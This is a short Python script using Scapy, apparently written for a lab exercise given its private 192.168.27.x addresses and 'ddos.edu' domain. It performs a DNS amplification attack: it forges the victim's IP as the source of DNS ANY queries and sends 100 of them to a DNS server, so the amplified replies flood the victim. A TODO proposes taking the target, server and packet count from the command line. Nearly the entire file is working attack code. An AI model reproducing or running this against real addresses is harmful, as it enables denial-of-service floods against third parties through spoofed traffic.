#!/usr/bin/env python3

from scapy.all import *

# TODO: handle command-line arguments passed to the script (sys.argv)
# python3 dns_amp_attack.py <target_addr> <dns_server_addr> <domain> <number_of_packets>

victim_addr = '192.168.27.11'
dns_server_addr = '192.168.27.9'
domain = 'ddos.edu'

ip = IP(src=victim_addr, dst=dns_server_addr)
udp = UDP(dport=53)
dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255))

request = (ip/udp/dns)
send(request, count=100)
